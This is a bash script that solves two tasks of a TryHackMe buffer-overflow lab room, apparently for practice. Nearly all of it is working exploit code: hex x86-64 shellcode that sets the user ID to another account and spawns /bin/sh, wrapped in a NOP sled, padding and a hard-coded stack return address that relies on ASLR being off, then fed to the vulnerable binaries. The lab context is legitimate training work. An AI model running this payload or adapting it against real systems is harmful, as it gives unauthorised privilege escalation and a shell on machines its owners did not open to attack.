#!/usr/bin/env bash

# simple script to solve task eight and nine (overflow 2 and 3) of the buffer overflow room on tryhack me: https://tryhackme.com/room/bof1

# based on the write-up here: https://l1ge.github.io/tryhackme_bof1/
# this room is not as easy as it makes itself out to be :D

# util function in bash to repeat characters (equiv to 'A'*60 in python for example)
function repeat { printf "%.s$1" $(seq 1 $2); }

# note this shell code is 62 bytes long, sets an exit code and sets the UUID to user2, required for the secret file
# without the exit code (like the shellcode provided in the room) the program will just continue and crash.
shellcode1='\x48\x31\xFF\x48\x31\xC0\x48\x31\xF6\x66\xBE\xEA\x03\x66\xBF\xEA\x03\xB0\x71\x0F\x05\x48\x31\xD2\x48\xBB\xFF\x2F\x62\x69\x6E\x2F\x73\x68\x48\xC1\xEB\x08\x53\x48\x89\xE7\x48\x31\xC0\x50\x57\x48\x89\xE6\xB0\x3B\x0F\x05\x6A\x01\x5F\x6A\x3C\x58\x0F\x05'

# a target position in the stack, roughly where the buffer is. Always in a valid place thanks to no ASLR on the machine
# note that is different in gdb vs command line, due to stack positioning. in gdb, use \x60 instead of \x98
target1='\x98\xe2\xff\xff\xff\x7f'

# final code
injected1=$(repeat "\x90" 60)$(printf $shellcode1)$(repeat A 30)$(printf $target1)

~/overflow-3/buffer-overflow $injected1


# note changing EA to EB 13 characters in. this is switching from uuid 1002 (03EA) to 1003 (03EB)
shellcode2='\x48\x31\xFF\x48\x31\xC0\x48\x31\xF6\x66\xBE\xEB\x03\x66\xBF\xEA\x03\xB0\x71\x0F\x05\x48\x31\xD2\x48\xBB\xFF\x2F\x62\x69\x6E\x2F\x73\x68\x48\xC1\xEB\x08\x53\x48\x89\xE7\x48\x31\xC0\x50\x57\x48\x89\xE6\xB0\x3B\x0F\x05\x6A\x01\x5F\x6A\x3C\x58\x0F\x05'
target2='\x98\xe2\xff\xff\xff\x7f'
injected2=$(repeat "\x90" 60)$(printf $shellcode2)$(repeat A 32)$(printf $target2)

~/overflow-4/buffer-overflow-2 $injected2